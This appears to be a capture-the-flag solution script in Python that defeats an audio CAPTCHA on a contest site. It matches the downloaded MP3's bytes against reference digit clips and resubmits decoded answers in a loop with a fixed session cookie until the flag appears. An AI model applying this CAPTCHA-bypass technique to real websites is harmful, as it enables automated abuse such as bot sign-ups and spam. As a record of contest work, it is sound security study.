#!/usr/bin/python3
import requests
requests.get("http://sound-captcha.sstf.site/",cookies={"PHPSESSID" : "836034d1480117f4c2863a91593a51cd"}).text
while(True):#Itereate until we get the flag
    sound = requests.get("http://sound-captcha.sstf.site/cache/8d5dfced7d20b0cbe4d9b6ae0860cbd7.mp3").content #Get captcha's sound
    soundsNumber = ['' for i in range(10)]#initialize array
    for i in range(10):#Add sounds to our array
        soundsNumber[i] = open("./challenge/mp3/%d.mp3" % i,"rb").read()

    captcha = ""
    while(len(captcha) != 6):#Iterate until getting all captcha's letters
        for soundNum,soundVoice in enumerate(soundsNumber):
            if(soundVoice in sound):
                if(sound.index(soundVoice) == 0):
                    captcha += str(soundNum)
                    sound = sound.replace(soundVoice,b"",1)#Remove the letter that has been found
    #Post captcha to challenge's page
    r = requests.post("http://sound-captcha.sstf.site/",data={"captcha_val" : captcha},cookies={"PHPSESSID" : "836034d1480117f4c2863a91593a51cd"}).text
    if("SCTF" in r):
        print(r)
        exit()
    elif("Correct Captcha!" not in r):
        print("Something bad happened")
        print(r)
        exit()
    else:
        print("Everything is fine")
